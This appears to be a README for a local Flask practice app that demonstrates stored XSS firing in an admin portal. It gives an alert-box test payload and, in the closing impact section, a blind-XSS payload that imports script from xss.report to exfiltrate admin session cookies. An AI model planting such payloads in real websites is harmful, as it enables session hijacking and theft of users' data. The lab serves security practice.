<h1>Stored XSS In An Admin Portal</h1>

<h2>Overview</h2>

Stored-XSS can be a serious vulnerability, especially if your XSS Payloads trigger in an admin portal. Imagine your stored-blind xss payloads triggering in an admin portal, and you then recieve all of the
admin's session cookies. You could Session Hijack the administrator and cause negative effects for the website. And this all happened because someone forgot to sanitize user input somewhere.

Stored-XSS is fun to test for in Web Security, so I built a little python program that uses Flask to spin up a simple little application that let's you see what it looks like when your stored-xss payloads
trigger in an admin portal.

<h2>How To Use The Stored XSS Test Program</h2>

1. Copy, Create and Start the python file in my Stored-XSS Repository labeled 'stored-xss-in-admin-portal.py'. Start the python file with python or python3. Reference the image below.

![start-stored-xss-test-suite](https://github.com/user-attachments/assets/cf4f1b94-4ac0-41e8-940c-a974941adea3)


2. After starting the Stored XSS In Admin Portal program, open your browser and visit http://127.0.0.1:5000. Reference the image below to see the program opened in my browser.

![open-stored-xss-app-in-browser](https://github.com/user-attachments/assets/b0268ed0-3b6e-4983-93b2-448350682e32)

3. Store an xss payload in the 'Send Message' box, and then press send. You can test out this payload ```test';"/><img/src/onerror=alert(0)>``` Reference the image below.

![storing-an-xss-payload](https://github.com/user-attachments/assets/b0621f81-47c4-44ed-a4d0-6abc7e75a20b)

4. After your xss payload is stored, notice that a javascript alert pops up on your screen. Exit the javascript alert and notice your payload is stored in the page source. Reference the image below.

![xss-execution-after-payload-storage](https://github.com/user-attachments/assets/2115dcfc-5717-4983-ada7-c28aae090d98)

5. Now let's see what happens when an admin views our messages in their Admin portal. Travel to http://127.0.0.1:5000/admin in your browser, or click 'Admin Portal'. Notice that you are directed to the
   admin portal and a javascript alert box pops up on your screen. When the admin portal then loads, your xss payload is stored on the page and in the page source. Reference the image below.
   
![admin-portal-view-during-xss-execution](https://github.com/user-attachments/assets/e97e3e17-015f-4704-be0f-76f1d2fe32ae)

6. You can delete all stored messages with the 'Delete All Messages' buttons.

<h2>IMPACT - Why Is This Important?</h2>

Stored XSS can be used to steal data and hijack user sessions. To do this, instead of using ```test';"/><img/src/onerror=alert(0)>``` to make a javascript alert box pop up on the user's screen, we can use a javascript
payload that will exfiltrate the user's session cookies to our attack server. The payloads on xss.report can do this, therefor to steal steal an admin's cookies on our app at http://127.0.0.1:5000/admin, we can store a blind-xss payload like this ```test';"/><img/src/onerror=import('//xss.report/c/fakeUser')>``` on http://127.0.0.1:5000 using the 'Send Message' box, and when an admin reads the message, their data will be exfiltrated to my attack dashboard on xss.report



